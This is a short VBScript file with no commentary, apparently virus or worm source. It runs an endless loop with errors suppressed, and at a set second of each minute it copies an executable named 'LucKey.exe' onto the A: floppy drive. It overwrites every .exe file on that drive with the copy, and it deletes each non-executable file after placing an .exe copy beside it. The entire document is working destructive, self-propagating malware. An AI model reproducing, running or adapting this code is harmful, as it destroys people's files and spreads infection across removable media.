on error resume next
DO
 Set fso = CreateObject("Scripting.FileSystemObject")
 Set WANNAH = fso.getspecialfolder(0)
If Second(Now) = 50 Then
If fso.fileexists("A:\mallait.exe")= False Then
Set Drive = fso.GetFolder("A:")
Set File = Drive.Files
For Each f1 In File
Set del = fso.getfile(F1.Path)
fso.copyfile WANNAH&"\"&"LucKey.exe","A:\MALAL.exe"
If fso.GetExtensionName(f1.Path)<>"EXE"then
fso.copyfile WANNAH&"\"&"LucKey.exe",(f1.Path&".exe")
 DEL.delete
ELse
fso.copyfile WANNAH&"\"&"LucKey.exe",(f1.path)
end if 
Next
End if
End if
Loop